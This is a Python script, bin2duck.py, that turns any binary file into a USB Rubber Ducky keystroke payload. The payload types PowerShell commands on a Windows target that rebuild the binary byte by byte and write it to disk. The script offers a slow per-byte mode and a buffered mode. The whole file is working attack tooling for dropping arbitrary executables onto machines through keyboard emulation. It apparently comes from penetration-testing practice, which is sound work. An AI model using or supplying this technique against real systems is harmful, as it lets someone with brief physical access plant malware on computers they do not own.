#!/bin/python
import os, sys, getopt
from os.path import exists

__description__ = 'Inject binary files to windows using the keyboard emulator USB Rubber Ducky'
__author__ = 'Carlos Benitez, https://cybersonthestorm.com'
__version__ = '0.0.3'
__date__ = '04/09/2021'

def main(argv):
   orig_stdout = sys.stdout 
   binfilename = ''
   injectfilename = ''
   mode = '1'
   helpstring='bin2duck.py -i <binfilename> [-o <injectfilename>] [-m mode]'
   try:
      opts, args = getopt.getopt(argv,"hi:o:m:",["ifile=","ofile=","mode"])
   except getopt.GetoptError:
      print (helpstring)
      sys.exit(2)

   for opt, arg in opts:
      if opt == '-h':
         print (helpstring)
         sys.exit()
      elif opt in ("-i", "--ifile"):
         binfilename = arg

      elif opt in ("-o", "--ofile"):
         injectfilename = arg

      elif opt in ("-m", "--mode"):
         mode = arg

   if binfilename.strip() == '':
      print (helpstring)
      print ('Missing binary input filename')
      sys.exit(2)   

   if not exists(binfilename):
      print (helpstring)
      print ('input filename ',binfilename,' not found')
      sys.exit(2)   

   if injectfilename.strip() == '':
      injectfilename = "inj."+binfilename
      
   print ('Exe filename is: ', binfilename)
   print ('Inject filename is: ', injectfilename)
   print ('Mode is: ', mode)


   delay="DELAY 2000"
   createfile="STRING $bytecode=New-Object byte[] "
   preprefix="STRING $bytecode["
   prefix="]=[convert]::ToByte("
   suffix=")"
   enter="ENTER"
   outfile = open(injectfilename,"w")
   sys.stdout = outfile

   size=os.path.getsize(binfilename)

   infile = open(binfilename,"rb")
   bytecode = list(infile.read())
   infile.close()

   print(delay)
   print ("STRING # Reading ",size," bytes")
   print(enter)
   print("STRING $start=date")
   print(enter)

   # Straight forward mode. Adds one line per byte.
   # Veeeery slow but reliable
   if mode == '1':
      index=0
      while index < size:
          injectline=preprefix + str(index) + prefix + str(bytecode[index]) + suffix
          print(injectline)
          print(enter)
          index += 1

   # Buffered mode. Adds one line per <buffer> bytes.
   # In the middle
   #
   # $bytecodetmp = 77, 90,144,3,0,....
   # $bytecode = $bytecode + $bytecodetemp
   if mode == '2':
      bufsize=512
      interdelay='200'
      index=0
      while index < size:
          bufindex=0
          injectline="STRING $bytecodetemp = $bytecodetemp + " 
          print("STRING # Progress: "+(str(int(100*index/size)))+"%, "+str(index)+" bytes")
          print(enter)
          while bufindex < bufsize and (index+bufindex) < size:
              injectline=injectline + str(bytecode[index+bufindex])
              if not (bufindex == bufsize-1 or (index+bufindex) == size-1):
                   injectline=injectline + ','
              bufindex += 1
          print(injectline)
          print(enter)
          print("DELAY "+interdelay)
              
          index += bufindex
      print("STRING # Progress: "+(str(int(100*index/size)))+"%, "+str(index)+" bytes")
      print(enter)
      print("STRING $end=date")
      print(enter)
      print("STRING $start")
      print(enter)
      print("STRING $end")
      print(enter)

      print("STRING [byte[]] $bytecode = $bytecodetemp")
      print(enter)
      print("DELAY "+interdelay)
   print("STRING [io.file]::WriteAllBytes('"+injectfilename+"',$bytecode)")
   print(enter)
   sys.stdout = orig_stdout
   outfile.close()
if __name__ == "__main__":
   main(sys.argv[1:])

#CertUtil -hashfile <injectfilename> MD5
